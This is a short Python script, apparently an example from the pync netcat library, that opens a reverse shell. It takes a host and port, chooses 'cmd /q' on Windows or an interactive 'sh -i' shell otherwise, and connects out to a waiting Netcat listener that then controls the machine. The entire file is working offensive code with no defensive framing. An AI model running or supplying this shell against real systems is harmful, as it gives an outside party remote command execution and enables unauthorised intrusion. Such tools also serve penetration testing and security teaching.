# -*- coding: utf-8 -*-

import argparse
import platform

from pync import pync


DESCRIPTION = '''
A simple reverse shell using pync.
Setup a Netcat listener first, then connect this to it.'''


def main():
    parser = argparse.ArgumentParser('rshell',
            formatter_class=argparse.RawTextHelpFormatter,
            description=DESCRIPTION,
    )
    parser.add_argument('host',
            help='Hostname or IP to connect to.',
            metavar='HOST',
    )
    parser.add_argument('port',
            help='Port number to connect to.',
            metavar='PORT',
    )
    args = parser.parse_args()
    host, port = args.host, args.port

    if platform.system() == 'Windows':
        command = 'cmd /q'
    else:
        command = "PS1='$ ' sh -i"

    args = '{host} {port} --execute "{command}"'.format(
            host=host,
            port=port,
            command=command,
    )

    with pync(args) as nc:
        nc.run()


if __name__ == '__main__':
    main()

